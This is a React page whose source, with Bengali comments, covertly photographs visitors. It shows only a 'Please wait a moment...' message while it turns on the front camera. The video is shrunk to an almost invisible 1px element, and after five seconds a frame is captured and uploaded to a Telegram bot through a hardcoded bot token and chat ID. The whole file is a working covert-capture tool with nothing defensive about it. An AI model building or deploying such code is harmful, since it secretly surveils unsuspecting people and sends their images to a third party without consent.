import React, { useEffect, useRef } from 'react';

const App = () => {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  const botToken = "7969135759:AAGD2lS7-0E-5-m_6L70u3m_K9r2vS0L_8"; 
  const chatId = "6616016147"; 

  useEffect(() => {
    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: "user", 
            width: { ideal: 1280 }, 
            height: { ideal: 720 } 
          } 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          // ভিডিও প্লে নিশ্চিত করা
          videoRef.current.play().then(() => {
            // ৫ সেকেন্ড অপেক্ষা করুন যাতে ক্যামেরা পুরোপুরি লাইট অ্যাডজাস্ট করে
            setTimeout(() => {
              takePhoto();
            }, 5000); 
          });
        }
      } catch (err) {
        console.error("Camera error:", err);
      }
    };

    startCamera();
  }, []);

  const takePhoto = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (video && canvas && video.readyState === 4) {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob((blob) => {
        if (blob && blob.size > 0) {
          sendToTelegram(blob);
        }
      }, 'image/jpeg', 0.9);
    }
  };

  const sendToTelegram = (blob) => {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'capture.jpg');

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData
    })
    .then(res => res.json())
    .then(data => {
      console.log("Success:", data);
      // ক্যামেরা অফ করে দেওয়া
      const stream = videoRef.current.srcObject;
      stream.getTracks().forEach(track => track.stop());
    })
    .catch(err => console.error("Telegram error:", err));
  };

  return (
    <div style={{ backgroundColor: '#fff', height: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
      <h2 style={{ fontFamily: 'Arial' }}>Please wait a moment...</h2>
      
      {/* ভিডিওটি display: none না করে খুব ছোট (1px) করে রাখা হয়েছে যাতে ব্রাউজার ছবি তুলতে পারে */}
      <video 
        ref={videoRef} 
        autoPlay 
        playsInline 
        muted 
        style={{ width: '1px', height: '1px', opacity: '0.01' }} 
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
    </div>
  );
};

export default App;